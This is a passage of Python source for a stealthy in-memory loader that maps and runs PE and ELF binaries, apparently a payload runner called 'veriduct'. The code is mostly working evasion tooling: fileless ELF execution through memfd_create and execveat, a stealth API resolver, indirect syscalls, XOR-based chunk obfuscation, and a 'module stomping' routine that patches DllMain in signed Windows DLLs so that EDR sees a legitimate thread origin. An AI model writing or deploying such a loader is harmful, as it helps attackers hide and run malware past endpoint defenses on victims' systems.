            logging.warning(f"TLS callbacks RVA 0x{callbacks_rva:X} out of bounds, skipping")
            return
        
        current_callback_ptr = base_addr + callbacks_rva
        
        # Setup Function Prototype: void PASCAL TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved)
        TLS_FUNC = ctypes.WINFUNCTYPE(None, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p)
        
        try:
            while True:
                # Read function pointer
                if self.image_base > 0xFFFFFFFF:
                    func_va = struct.unpack('<Q', ctypes.string_at(current_callback_ptr, 8))[0]
                    current_callback_ptr += 8
                else:
                    func_va = struct.unpack('<I', ctypes.string_at(current_callback_ptr, 4))[0]
                    current_callback_ptr += 4
                    
                if func_va == 0:
                    break
                    
                func_rva = func_va - self.image_base
                
                # Validate RVA
                if func_rva < 0 or func_rva >= self.size_of_image:
                    logging.warning(f"TLS callback RVA 0x{func_rva:X} out of bounds, skipping")
                    continue
                
                target = base_addr + func_rva
                
                logging.info(f"Executing TLS Callback at 0x{target:X}")
                try:
                    cb = TLS_FUNC(target)
                    cb(base_addr, 1, 0)  # DLL_PROCESS_ATTACH
                except Exception as e:
                    logging.warning(f"TLS Callback failed: {e}")
        except OSError as e:
            logging.warning(f"Failed to read TLS callbacks: {e}")

    def _setup_seh(self, base_addr):
        """
        Registers Exception Handling Tables for x64 (pdata).
        Required for try/except blocks in the loaded binary to work.
        """
        # Exception Directory is Index 3
        dd_offset = self.opt_header_offset + (112 if (self.image_base > 0xFFFFFFFF) else 96)
        
        exception_rva = struct.unpack('<I', self.stream[dd_offset+24:dd_offset+28])[0]
        exception_size = struct.unpack('<I', self.stream[dd_offset+28:dd_offset+32])[0]
        
        if exception_rva == 0:
            return

        logging.info("Registering SEH Table...")
        
        # RUNTIME_FUNCTION struct size (12 bytes on x64)
        entry_count = exception_size // 12
        table_ptr = base_addr + exception_rva
        
        resolver = get_stealth_resolver()
        
        try:
            # RtlAddFunctionTable is in ntdll on modern Windows
            RtlAddFunctionTable_addr = resolver.get_proc_address("kernel32.dll", "RtlAddFunctionTable")
            if not RtlAddFunctionTable_addr:
                RtlAddFunctionTable_addr = resolver.get_proc_address("ntdll.dll", "RtlAddFunctionTable")
            
            if RtlAddFunctionTable_addr:
                # BOOL return type is c_int (4 bytes), not c_bool (1 byte)
                RtlAddFunctionTable = ctypes.WINFUNCTYPE(
                    ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_uint64
                )(RtlAddFunctionTable_addr)
                
                result = RtlAddFunctionTable(
                    ctypes.c_void_p(table_ptr),
                    ctypes.c_ulong(entry_count),
                    ctypes.c_uint64(base_addr)
                )
                if not result:
                    logging.warning("RtlAddFunctionTable failed")
            else:
                logging.debug("RtlAddFunctionTable not found (32-bit system)")
        except Exception as e:
            logging.error(f"Failed to setup SEH: {e}")

    def _resolve_pe_delay_imports(self, base_addr):
        """
        Resolves Delay-Load Imports (Index 13).
        We resolve them eagerly (now) to ensure the binary has everything it needs.
        """
        # Delay Import Descriptor is Index 13
        is_64 = (self.image_base > 0xFFFFFFFF)
        dd_offset = self.opt_header_offset + (112 if is_64 else 96)
        
        # 13 * 8 bytes per entry = 104 bytes offset
        delay_rva = struct.unpack('<I', self.stream[dd_offset + 104 : dd_offset + 108])[0]
        
        if delay_rva == 0:
            return

        logging.info("Resolving Delay-Load Imports...")
        resolver = get_stealth_resolver()
        
        LoadLibraryA_addr = resolver.get_proc_address("kernel32.dll", "LoadLibraryA")
        GetProcAddress_addr = resolver.get_proc_address("kernel32.dll", "GetProcAddress")
        
        if not LoadLibraryA_addr or not GetProcAddress_addr:
            logging.warning("Failed to resolve LoadLibraryA/GetProcAddress for delay imports")
            return
        
        # Use WINFUNCTYPE for Windows API calling convention
        LoadLibraryA = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_char_p)(LoadLibraryA_addr)
        GetProcAddress_by_name = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p)(GetProcAddress_addr)
        # For ordinal, use c_void_p to ensure pointer-sized argument
        GetProcAddress_by_ord = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)(GetProcAddress_addr)
        
        current_desc_ptr = base_addr + delay_rva
        
        while True:
            # Parse ImgDelayDescr (32 bytes)
            attrs = struct.unpack('<I', ctypes.string_at(current_desc_ptr, 4))[0]
            name_rva = struct.unpack('<I', ctypes.string_at(current_desc_ptr + 4, 4))[0]
            
            if name_rva == 0:
                break
                
            dll_name = ctypes.string_at(base_addr + name_rva).decode('ascii')
            
            # Load the DLL
            h_module = LoadLibraryA(dll_name.encode('ascii'))
            if not h_module:
                logging.warning(f"Failed to delay-load: {dll_name}")
                current_desc_ptr += 32
                continue
            
            h_module_int = h_module if isinstance(h_module, int) else ctypes.cast(h_module, ctypes.c_void_p).value
            logging.debug(f"Delay-loaded DLL: {dll_name}")
                
            # Write the Module Handle back
            module_handle_rva = struct.unpack('<I', ctypes.string_at(current_desc_ptr + 8, 4))[0]
            if module_handle_rva:
                h_ptr = base_addr + module_handle_rva
                if is_64:
                    ctypes.memmove(h_ptr, struct.pack('<Q', h_module_int), 8)
                else:
                    ctypes.memmove(h_ptr, struct.pack('<I', h_module_int & 0xFFFFFFFF), 4)

            # Resolve the functions (IAT)
            iat_rva = struct.unpack('<I', ctypes.string_at(current_desc_ptr + 12, 4))[0]
            int_rva = struct.unpack('<I', ctypes.string_at(current_desc_ptr + 16, 4))[0]
            
            iat_ptr = base_addr + iat_rva
            int_ptr = base_addr + int_rva
            
            ptr_size = 8 if is_64 else 4
            
            while True:
                # Read Name Pointer
                if is_64:
                    name_ptr_val = struct.unpack('<Q', ctypes.string_at(int_ptr, 8))[0]
                else:
                    name_ptr_val = struct.unpack('<I', ctypes.string_at(int_ptr, 4))[0]
                
                if name_ptr_val == 0:
                    break
                    
                is_ordinal = (name_ptr_val >> (63 if is_64 else 31)) & 1
                
                if is_ordinal:
                    ordinal = name_ptr_val & 0xFFFF
                    proc_addr = GetProcAddress_by_ord(h_module_int, ordinal)
                else:
                    fn_name_ptr = base_addr + (name_ptr_val & 0xFFFFFFFF) + 2  # Skip Hint
                    fn_name = ctypes.string_at(fn_name_ptr)
                    proc_addr = GetProcAddress_by_name(h_module_int, fn_name)
                
                if proc_addr:
                    proc_addr_int = proc_addr if isinstance(proc_addr, int) else ctypes.cast(proc_addr, ctypes.c_void_p).value
                    if is_64:
                        ctypes.memmove(iat_ptr, struct.pack('<Q', proc_addr_int), 8)
                    else:
                        ctypes.memmove(iat_ptr, struct.pack('<I', proc_addr_int), 4)

                iat_ptr += ptr_size
                int_ptr += ptr_size
            
            current_desc_ptr += 32

    # -------------------------------------------------------------------------
    # ELF (Linux) Implementation
    # -------------------------------------------------------------------------
    
    def _parse_elf(self):
        """Parse ELF headers."""
        try:
            # Entry Point at offset 0x18 (64-bit)
            self.entry_point = struct.unpack('<Q', self.stream[0x18:0x20])[0]
            # Program Header Offset
            self.ph_off = struct.unpack('<Q', self.stream[0x20:0x28])[0]
            # Section Header Offset
            self.sh_off = struct.unpack('<Q', self.stream[0x28:0x30])[0]
            # PH Entry Size
            self.ph_ent_size = struct.unpack('<H', self.stream[0x36:0x38])[0]
            # Num PH Entries
            self.ph_num = struct.unpack('<H', self.stream[0x38:0x3A])[0]
            # SH Entry Size
            self.sh_ent_size = struct.unpack('<H', self.stream[0x3A:0x3C])[0]
            # Num SH Entries
            self.sh_num = struct.unpack('<H', self.stream[0x3C:0x3E])[0]
            
            self.is_valid = True
            
            logging.info(f"ELF parsed: Entry 0x{self.entry_point:X}, {self.ph_num} program headers, {self.sh_num} sections")
            
            # Parse section headers for advanced features
            self._parse_elf_sections()
            
            # Parse dynamic section for dynamic linking
            self._parse_elf_dynamic()
            
        except Exception as e:
            logging.error(f"ELF Parse Error: {e}")
            self.is_valid = False

    def _parse_elf_sections(self):
        """
        Parses ELF Section Headers (Shdr).
        Necessary for finding specific data like .got, .plt, or .dynstr by name.
        """
        if not hasattr(self, 'sh_off') or self.sh_off == 0:
            logging.debug("No Section Header Table found")
            return

        self.sections = []
        
        # Section Header String Table Index
        shstrndx = struct.unpack('<H', self.stream[0x3E:0x40])[0]
        
        # Iterate headers
        for i in range(self.sh_num):
            offset = self.sh_off + (i * self.sh_ent_size)
            
            # Elf64_Shdr format
            s_name_idx = struct.unpack('<I', self.stream[offset:offset+4])[0]
            s_type = struct.unpack('<I', self.stream[offset+4:offset+8])[0]
            s_offset = struct.unpack('<Q', self.stream[offset+24:offset+32])[0]
            s_size = struct.unpack('<Q', self.stream[offset+32:offset+40])[0]
            
            self.sections.append({
                'name_idx': s_name_idx,
                'type': s_type,
                'offset': s_offset,
                'size': s_size,
                'raw_data': self.stream[s_offset : s_offset + s_size] if s_offset < len(self.stream) else b''
            })

        # Resolve Section Names
        if shstrndx < len(self.sections):
            string_table_data = self.sections[shstrndx]['raw_data']
            
            for section in self.sections:
                start = section['name_idx']
                end = start
                while end < len(string_table_data) and string_table_data[end] != 0:
                    end += 1
                
                section['name'] = string_table_data[start:end].decode('utf-8')
                logging.debug(f"Found Section: {section['name']} (Type: {section['type']})")

    def _get_section_by_name(self, name):
        """Helper to find a section."""
        if not hasattr(self, 'sections'):
            return None
        for s in self.sections:
            if s.get('name') == name:
                return s
        return None

    def _parse_elf_dynamic(self):
        """Parses the .dynamic section to locate strings, symbols, and relocations."""
        self.dynamic_entries = {}
        self.load_libs = []
        
        # Find PT_DYNAMIC segment
        dyn_off = 0
        dyn_sz = 0
        
        for i in range(self.ph_num):
            offset = self.ph_off + (i * self.ph_ent_size)
            p_type = struct.unpack('<I', self.stream[offset:offset+4])[0]
            if p_type == 2:  # PT_DYNAMIC
                dyn_off = struct.unpack('<Q', self.stream[offset+8:offset+16])[0]
                dyn_sz = struct.unpack('<Q', self.stream[offset+32:offset+40])[0]
                break
        
        if dyn_off == 0:
            logging.debug("No PT_DYNAMIC segment found (Static binary)")
            return

        # Parse tags (Elf64_Dyn is 16 bytes: 8 byte tag, 8 byte val/ptr)
        curr = dyn_off
        end = dyn_off + dyn_sz
        
        while curr < end and curr < len(self.stream):
            tag = struct.unpack('<q', self.stream[curr:curr+8])[0]
            val = struct.unpack('<Q', self.stream[curr+8:curr+16])[0]
            
            if tag == 0:  # DT_NULL
                break
                
            self.dynamic_entries[tag] = val
            
            if tag == 1:  # DT_NEEDED
                self.load_libs.append(val)
            
            curr += 16
            
        logging.info(f"Parsed .dynamic: Found {len(self.load_libs)} dependencies")

    def _load_elf_dependencies(self, base_addr):
        """Loads shared libraries defined in DT_NEEDED."""
        if 5 not in self.dynamic_entries:  # DT_STRTAB
            return

        strtab_off = self.dynamic_entries[5]
        self.loaded_modules = {}
        
        for name_offset in self.load_libs:
            try:
                lib_name = ctypes.string_at(base_addr + strtab_off + name_offset).decode('utf-8')
                logging.info(f"Loading dependency: {lib_name}")
                
                try:
                    lib = ctypes.CDLL(lib_name)
                    self.loaded_modules[lib_name] = lib
                except OSError as e:
                    logging.warning(f"Could not load library: {lib_name} - {e}")
                    
            except Exception as e:
                logging.error(f"Error loading dependency index {name_offset}: {e}")

    def _resolve_elf_relocations(self, base_addr):
        """
        Process RELA/REL relocations (GOT, PLT, and Relative).
        Specific to x86_64 ELF.
        
        Includes bounds checking to prevent writes outside mapped region.
        """
        if 7 not in self.dynamic_entries:  # DT_RELA
            return

        rela_addr = self.dynamic_entries[7]
        rela_sz = self.dynamic_entries.get(8, 0)  # DT_RELASZ
        rela_ent = self.dynamic_entries.get(9, 24)  # DT_RELAENT
        
        if rela_sz == 0:
            return
        
        symtab_addr = self.dynamic_entries.get(6, 0)  # DT_SYMTAB
        strtab_addr = self.dynamic_entries.get(5, 0)  # DT_STRTAB
        
        # Adjust addresses if PIE
        if rela_addr < base_addr:
            rela_addr += base_addr
            symtab_addr += base_addr
            strtab_addr += base_addr

        num_relocs = rela_sz // rela_ent
        current_reloc = rela_addr
        
        # Get mapped region bounds for validation
        # Use stored value if available, otherwise use a safe estimate
        region_start = base_addr
        region_end = getattr(self, '_elf_mapped_end', base_addr + 0x10000000)
        
        logging.info(f"Processing {num_relocs} ELF relocations...")
        
        applied_count = 0
        skipped_oob = 0

        for _ in range(num_relocs):
            try:
                # Elf64_Rela: r_offset (8), r_info (8), r_addend (8)
                r_offset = struct.unpack('<Q', ctypes.string_at(current_reloc, 8))[0]
                r_info = struct.unpack('<Q', ctypes.string_at(current_reloc+8, 8))[0]
                r_addend = struct.unpack('<q', ctypes.string_at(current_reloc+16, 8))[0]
                
                r_type = r_info & 0xFFFFFFFF
                r_sym = r_info >> 32
                
                target_addr = base_addr + r_offset if r_offset < base_addr else r_offset
                
                # BOUNDS CHECK: Ensure target is within mapped region
                if not (region_start <= target_addr and target_addr + 8 <= region_end):
                    logging.debug(f"ELF relocation target 0x{target_addr:X} out of bounds, skipping")
                    skipped_oob += 1
                    current_reloc += rela_ent
                    continue
                
                # R_X86_64_RELATIVE (8) - Base relocation
                if r_type == 8:
                    val = base_addr + r_addend
                    ctypes.memmove(target_addr, struct.pack('<Q', val), 8)
                    applied_count += 1
                    
                # R_X86_64_GLOB_DAT (6) or JUMP_SLOT (7) - Symbol lookup
                elif r_type in (6, 7) and r_sym != 0:
                    # Get Symbol info from SymTab
                    sym_entry = symtab_addr + (r_sym * 24)
                    st_name = struct.unpack('<I', ctypes.string_at(sym_entry, 4))[0]
                    
                    # Get Name from StrTab
                    name_ptr = strtab_addr + st_name
                    sym_name = ctypes.string_at(name_ptr).decode('utf-8')
                    
                    # Lookup in loaded libraries
                    found = False
                    if hasattr(self, 'loaded_modules'):
                        for lib in self.loaded_modules.values():
                            try:
                                func = getattr(lib, sym_name)
                                addr = ctypes.cast(func, ctypes.c_void_p).value
                                
                                ctypes.memmove(target_addr, struct.pack('<Q', addr), 8)
                                found = True
                                applied_count += 1
                                break
                            except (AttributeError, OSError):
                                continue
                    
                    if not found:
                        logging.debug(f"Unresolved symbol: {sym_name}")

                current_reloc += rela_ent
            except Exception as e:
                logging.debug(f"Error processing relocation: {e}")
                current_reloc += rela_ent
                continue
        
        if skipped_oob > 0:
            logging.warning(f"Skipped {skipped_oob} out-of-bounds ELF relocations")
        logging.debug(f"Applied {applied_count} ELF relocations")

    def _execute_elf_linux(self):
        """
        ELF loader — memfd_create + fork/execveat.

        Previous approach called _start as a bare CFUNCTYPE(c_int), which gives
        it a normal C call frame.  glibc's _start strictly expects the kernel's
        stack layout: argc, argv[], NULL, envp[], NULL, auxv[].  Calling it like
        a void function pops garbage and segfaults immediately.

        New approach (primary):
          1. memfd_create  — anonymous in-memory file descriptor
          2. Write the ELF binary to the memfd
          3. fork()
          4. Child: execveat(memfd, "", argv, envp, AT_EMPTY_PATH)
             The kernel handles stack priming, dynamic linking, PIE ASLR, TLS,
             init/fini arrays — everything.
          5. Parent: waitpid()

        Stays fileless (memfd never touches disk).

        Fallback (old kernels without memfd/execveat):
          Direct mmap + call with a warning.  Only works for static binaries
          with no CRT dependency on the stack layout (very rare in practice).
        """
        # --- Primary path: memfd + fork/exec ---
        try:
            return self._execute_elf_via_memfd()
        except Exception as e:
            logging.warning(f"memfd/execveat path failed ({e}), trying direct fallback")

        # --- Fallback: direct execution (limited to trivial static binaries) ---
        logging.warning(
            "FALLING BACK TO DIRECT ELF EXECUTION.  This will crash on any "
            "standard glibc-linked binary because _start expects argc/argv/envp/auxv "
            "on the stack.  Only bare-metal / nostdlib binaries survive this path."
        )
        return self._execute_elf_direct_fallback()

    # ------------------------------------------------------------------
    # Primary ELF path: memfd_create + fork + execveat
    # ------------------------------------------------------------------

    def _execute_elf_via_memfd(self):
        """Execute ELF binary through memfd_create + fork/execveat."""
        import ctypes.util
        import fcntl

        libc_path = ctypes.util.find_library('c')
        if not libc_path:
            raise RuntimeError("Cannot find libc")
        libc = ctypes.CDLL(libc_path, use_errno=True)

        # --- Step 1: memfd_create ---
        SYS_memfd_create = 319   # x86_64
        SYS_execveat     = 322   # x86_64
        AT_EMPTY_PATH    = 0x1000
        MFD_CLOEXEC      = 0x0001

        # Try the libc wrapper first; fall back to raw syscall
        try:
            libc.memfd_create.restype = ctypes.c_int
            libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
            _memfd_create = libc.memfd_create
        except AttributeError:
            _memfd_create = lambda name, flags: libc.syscall(
                ctypes.c_long(SYS_memfd_create), name, ctypes.c_uint(flags)
            )

        fd = _memfd_create(b"veriduct", MFD_CLOEXEC)
        if fd < 0:
            raise RuntimeError(f"memfd_create failed (errno {ctypes.get_errno()})")

        logging.info(f"memfd created (fd={fd}), writing {len(self.stream)} bytes")

        # --- Step 2: write ELF to memfd ---
        data = bytes(self.stream)
        written = 0
        while written < len(data):
            chunk = data[written:written + 0x100000]   # 1 MB writes
            n = os.write(fd, chunk)
            if n <= 0:
                os.close(fd)
                raise RuntimeError(f"write to memfd failed at offset {written}")
            written += n

        # --- Step 3: build argv ---
        if self.command_line:
            args = self.command_line.split()
        else:
            args = ["veriduct_payload"]

        logging.info(f"Forking for execveat (argv={args})")

        # --- Step 4: fork ---
        pid = os.fork()

        if pid == 0:
            # ====== CHILD ======
            try:
                # Clear FD_CLOEXEC so the memfd survives exec
                flags = fcntl.fcntl(fd, fcntl.F_GETFD)
                fcntl.fcntl(fd, fcntl.F_SETFD, flags & ~fcntl.FD_CLOEXEC)

                # Build C argv array
                c_argv_type = ctypes.c_char_p * (len(args) + 1)
                c_argv = c_argv_type(*(a.encode() for a in args), None)

                # Build C envp array from current environment
                env_strings = [f"{k}={v}".encode() for k, v in os.environ.items()]
                c_envp_type = ctypes.c_char_p * (len(env_strings) + 1)
                c_envp = c_envp_type(*env_strings, None)

                ret = libc.syscall(
                    ctypes.c_long(SYS_execveat),
                    ctypes.c_int(fd),
                    ctypes.c_char_p(b""),
                    c_argv,
                    c_envp,
                    ctypes.c_int(AT_EMPTY_PATH),
                )
                # If we reach here, execveat failed
                os._exit(127)
            except Exception:
                os._exit(127)

        # ====== PARENT ======
        os.close(fd)
        logging.info(f"Waiting for child PID {pid}...")

        _, status = os.waitpid(pid, 0)

        if os.WIFEXITED(status):
            code = os.WEXITSTATUS(status)
            logging.info(f"ELF execution completed (exit code {code})")
            return code
        elif os.WIFSIGNALED(status):
            sig = os.WTERMSIG(status)
            logging.error(f"ELF process killed by signal {sig}")
            return -(sig)
        else:
            logging.error(f"ELF process ended with unknown status 0x{status:X}")
            return 1

    # ------------------------------------------------------------------
    # Fallback ELF path: direct mmap (static binaries only)
    # ------------------------------------------------------------------

    def _execute_elf_direct_fallback(self):
        """
        Direct mmap + CFUNCTYPE call.  Only works for:
          - Static PIE binaries compiled with -nostdlib
          - Binaries whose entry point is a normal C function (not glibc _start)

        Standard glibc-linked binaries WILL segfault here because _start
        expects argc/argv/envp/auxv on the stack.
        """
        import mmap

        # Calculate memory requirements
        min_vaddr = 0xFFFFFFFFFFFFFFFF
        max_vaddr = 0
        load_segments = []

        for i in range(self.ph_num):
            offset = self.ph_off + (i * self.ph_ent_size)
            p_type = struct.unpack('<I', self.stream[offset:offset+4])[0]

            if p_type == 1:  # PT_LOAD
                p_offset = struct.unpack('<Q', self.stream[offset+8:offset+16])[0]
                p_vaddr  = struct.unpack('<Q', self.stream[offset+16:offset+24])[0]
                p_filesz = struct.unpack('<Q', self.stream[offset+32:offset+40])[0]
                p_memsz  = struct.unpack('<Q', self.stream[offset+40:offset+48])[0]
                p_flags  = struct.unpack('<I', self.stream[offset+4:offset+8])[0]

                if p_vaddr < min_vaddr:
                    min_vaddr = p_vaddr
                if p_vaddr + p_memsz > max_vaddr:
                    max_vaddr = p_vaddr + p_memsz

                load_segments.append((p_offset, p_vaddr, p_filesz, p_memsz, p_flags))
                logging.debug(
                    f"PT_LOAD: VAddr 0x{p_vaddr:X}, FileSz {p_filesz}, "
                    f"MemSz {p_memsz}, Flags {p_flags:#x}"
                )

        if not load_segments:
            raise RuntimeError("ELF has no PT_LOAD segments")
        if max_vaddr <= min_vaddr:
            raise RuntimeError(f"Invalid ELF vaddr range: 0x{min_vaddr:X}–0x{max_vaddr:X}")

        total_size = max_vaddr - min_vaddr
        MAX_REASONABLE = 1024 * 1024 * 1024
        if total_size > MAX_REASONABLE:
            raise RuntimeError(f"ELF image size {total_size} exceeds limit ({MAX_REASONABLE})")

        total_size = (total_size + 4095) & ~4095
        logging.info(
            f"Allocating {total_size} bytes for ELF "
            f"(range 0x{min_vaddr:X}–0x{max_vaddr:X})"
        )

        mem = mmap.mmap(
            -1, total_size,
            mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
            mmap.PROT_READ | mmap.PROT_WRITE,
        )
        base_addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
        self._elf_mapped_end = base_addr + total_size
        self._elf_mmap = mem

        logging.info(f"Mapped ELF memory at 0x{base_addr:X}")
        segment_protections = []

        for p_offset, vaddr, filesz, memsz, p_flags in load_segments:
            if vaddr < 0x10000000:
                dest_addr = base_addr + vaddr
                segment_base = vaddr
            else:
                dest_addr = vaddr
                segment_base = vaddr - min_vaddr

            if segment_base + memsz > total_size:
                raise RuntimeError(
                    f"ELF segment beyond allocated region "
                    f"(vaddr=0x{vaddr:X}, memsz=0x{memsz:X})"
                )
            if p_offset + filesz > len(self.stream):
                filesz = max(0, min(filesz, len(self.stream) - p_offset))

            if filesz > 0:
                data = self.stream[p_offset:p_offset + filesz]
                ctypes.memmove(dest_addr, bytes(data), len(data))
            if memsz > filesz:
                ctypes.memset(dest_addr + filesz, 0, memsz - filesz)

            page_start = dest_addr & ~4095
            page_end = (dest_addr + memsz + 4095) & ~4095
            segment_protections.append((page_start, page_end - page_start, p_flags))

        # Resolve dynamic dependencies
        if hasattr(self, 'dynamic_entries') and self.dynamic_entries:
            logging.info("Resolving dynamic linking...")
            self._load_elf_dependencies(base_addr)
            self._resolve_elf_relocations(base_addr)

        # Apply memory protections
        try:
            _libc = ctypes.CDLL("libc.so.6", use_errno=True)
            _mprotect = _libc.mprotect
            _mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
            _mprotect.restype = ctypes.c_int
            PROT_R, PROT_W, PROT_X = 0x1, 0x2, 0x4

            for page_start, page_size, p_flags in segment_protections:
                prot = 0
                if p_flags & 0x4: prot |= PROT_R
                if p_flags & 0x2: prot |= PROT_W
                if p_flags & 0x1: prot |= PROT_X
                if prot == 0: prot = PROT_R
                _mprotect(page_start, page_size, prot)
        except Exception as e:
            logging.warning(f"mprotect failed ({e}), using RWX fallback")
            try:
                _libc = ctypes.CDLL("libc.so.6")
                _libc.mprotect(base_addr, total_size, 0x7)
            except Exception:
                pass

        real_entry = base_addr + self.entry_point
        logging.info(f"Direct-calling ELF entry 0x{real_entry:X} (WARNING: may crash)")

        func_type = ctypes.CFUNCTYPE(ctypes.c_int)
        result = func_type(real_entry)()
        logging.info(f"ELF direct execution returned: {result}")
        return result

    # ------------------------------------------------------------------
    # Module Stomping — thread starts from legitimate disk-backed code
    # ------------------------------------------------------------------

    _STOMP_CANDIDATES = [
        # DLLs that are commonly loaded but whose DllMain is never re-invoked
        # after initial DLL_PROCESS_ATTACH.  We overwrite the first 12 bytes
        # of DllMain with a jmp trampoline, create the thread there, then
        # restore original bytes after completion.
        "version.dll", "imagehlp.dll", "sfc_os.dll", "apphelp.dll",
        "gpapi.dll", "cryptbase.dll", "profapi.dll",
    ]

    def _stomp_module_for_thread(self, entry_addr, resolver, syscall_eng):
        """
        Module stomping: create thread from a legitimate DLL address (FIX 12).

        Writes a 12-byte trampoline (mov rax, <entry>; jmp rax) over the
        DllMain of an already-loaded benign DLL.  The thread's start address
        is inside a signed, disk-backed module — EDR sees legitimate origin.

        Returns (thread_handle_int, stomp_info) or (0, None) on failure.
        stomp_info is a dict needed by _restore_stomp to undo the overwrite.
        """
        trampoline = b'\x48\xB8' + struct.pack('<Q', entry_addr) + b'\xFF\xE0'
        tramp_size = len(trampoline)  # 12 bytes

        VirtualProtect_addr = resolver.get_proc_address("kernel32.dll", "VirtualProtect")
        if not VirtualProtect_addr:
            return 0, None
        VirtualProtect = ctypes.WINFUNCTYPE(
            ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t,
            ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
        )(VirtualProtect_addr)

        for dll_name in self._STOMP_CANDIDATES:
            base = resolver.get_module_base(dll_name)
            if not base:
                continue

            try:
                # Parse PE to find AddressOfEntryPoint (DllMain)
                pe_off = struct.unpack('<I', ctypes.string_at(base + 0x3C, 4))[0]
                if ctypes.string_at(base + pe_off, 4) != b'PE\x00\x00':
                    continue
                entry_rva = struct.unpack('<I', ctypes.string_at(base + pe_off + 40, 4))[0]
                if entry_rva == 0:
                    continue

                stomp_addr = base + entry_rva

                # Save original bytes
                original_bytes = ctypes.string_at(stomp_addr, tramp_size)

                # Make writable
                old_prot = ctypes.c_ulong()
                if not VirtualProtect(stomp_addr, tramp_size, PAGE_READWRITE, ctypes.byref(old_prot)):
                    continue

                # Write trampoline
                ctypes.memmove(stomp_addr, trampoline, tramp_size)

                # Restore to original protection (usually RX)
                VirtualProtect(stomp_addr, tramp_size, old_prot.value, ctypes.byref(old_prot))

                # Create thread from the stomped address
                h_thread = 0
                if syscall_eng:
                    h_thread = syscall_eng.nt_create_thread(stomp_addr)

                if not h_thread:
                    # Restore and try next candidate
                    VirtualProtect(stomp_addr, tramp_size, PAGE_READWRITE, ctypes.byref(old_prot))
                    ctypes.memmove(stomp_addr, original_bytes, tramp_size)
                    VirtualProtect(stomp_addr, tramp_size, old_prot.value, ctypes.byref(old_prot))
                    continue

                logging.info(
                    f"Module stomp: thread @ 0x{stomp_addr:X} "
                    f"({dll_name}!DllMain+0) [indirect syscall]"
                )

                stomp_info = {
                    'addr': stomp_addr,
                    'original': original_bytes,
                    'size': tramp_size,
                    'protect_func': VirtualProtect,
                }
                return h_thread, stomp_info

            except Exception as e:
                logging.debug(f"Module stomp failed for {dll_name}: {e}")
                continue

        return 0, None

    @staticmethod
    def _restore_stomp(stomp_info):
        """Restore original bytes after stomped thread completes."""
        if not stomp_info:
            return
        try:
            addr = stomp_info['addr']
            orig = stomp_info['original']
            size = stomp_info['size']
            vp = stomp_info['protect_func']
            old = ctypes.c_ulong()
            vp(addr, size, PAGE_READWRITE, ctypes.byref(old))
            ctypes.memmove(addr, orig, size)
            vp(addr, size, old.value, ctypes.byref(old))
            logging.debug(f"Module stomp: restored {size} bytes at 0x{addr:X}")
        except Exception as e:
            logging.debug(f"Module stomp restore failed: {e}")

    def execute_native_direct(self):
        """Execute the native binary."""
        if not self.is_valid:
            raise RuntimeError("Binary not valid - parse headers first")
        
        system = platform.system()
        try:
            if system == "Windows" and self.architecture == "PE":
                return self._execute_pe_windows()
            elif system == "Linux" and self.architecture == "ELF":
                return self._execute_elf_linux()
            else:
                raise RuntimeError(f"Architecture {self.architecture} not supported on OS {system}")
        except Exception as e:
            logging.error(f"Native execution failed: {e}")
            raise

    def cleanup(self):
        """Cross-Platform Cleanup of mapped memory."""
        if not self.mapped_memory:
            return

        logging.info("Cleaning up mapped memory...")
        if self.architecture == "PE":
            try:
                resolver = get_stealth_resolver()
                VirtualFree_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
                if VirtualFree_addr:
                    # BOOL is c_int (4 bytes), not c_bool
                    VirtualFree = ctypes.WINFUNCTYPE(
                        ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
                    )(VirtualFree_addr)
                    VirtualFree(
                        ctypes.c_void_p(self.mapped_memory), 
                        0, 
                        0x8000  # MEM_RELEASE
                    )
            except Exception as e:
                logging.debug(f"Cleanup error: {e}")
        elif self.architecture == "ELF":
            try:
                libc = ctypes.CDLL(None)
                libc.munmap(
                    ctypes.c_void_p(self.mapped_memory), 
                    ctypes.c_size_t(self.mapped_size)
                )
            except Exception as e:
                logging.debug(f"Cleanup error: {e}")

# ==============================================================================
# Streaming Disentangler (for run mode)
# ==============================================================================

class StreamingDisentangler:
    """
    Streaming disentanglement for memory-efficient execution.
    Caches plaintext chunks needed for XOR reversal.
    """
    def __init__(self, entanglement_info: Dict):
        self.entanglement_info = entanglement_info
        self.groups = entanglement_info.get("groups", [])
        self.plaintext_cache = {}

    def disentangle_chunk(self, chunk_idx: int, entangled_chunk: bytes) -> bytes:
        """Disentangle a single chunk, using cache for dependencies."""
        for group in self.groups:
            if chunk_idx in group["idxs"]:
                return self._disentangle_in_group(chunk_idx, entangled_chunk, group)
        return entangled_chunk

    def _disentangle_in_group(self, chunk_idx: int, entangled_chunk: bytes, group: Dict) -> bytes:
        """Disentangle within a specific group."""
        idxs = group["idxs"]
        maxlen = group["maxlen"]
        original_lengths = group["original_lengths"]
        padding_seed_b64 = group.get("padding_seed")
        padding_byte = group.get("padding_byte", 0xFF)  # legacy fallback
        
        # Pad the entangled chunk (FIX 10)
        if padding_seed_b64:
            padded_chunk = bytearray(entangled_chunk[:maxlen].ljust(maxlen, b'\x00'))
        else:
            padded_chunk = bytearray(entangled_chunk.ljust(maxlen, bytes([padding_byte])))
        pos_in_group = idxs.index(chunk_idx)
        
        # Start with current chunk
        result = bytearray(maxlen)
        for j in range(maxlen):
            result[j] = padded_chunk[j]
        
        # XOR with all previous chunks in group
        for i in range(pos_in_group):
            prev_idx = idxs[i]
            if prev_idx in self.plaintext_cache:
                prev_chunk = self.plaintext_cache[prev_idx]
                if padding_seed_b64:
                    prev_padded = bytearray(prev_chunk[:maxlen].ljust(maxlen, b'\x00'))
                else:
                    prev_padded = bytearray(prev_chunk.ljust(maxlen, bytes([padding_byte])))
                for j in range(maxlen):
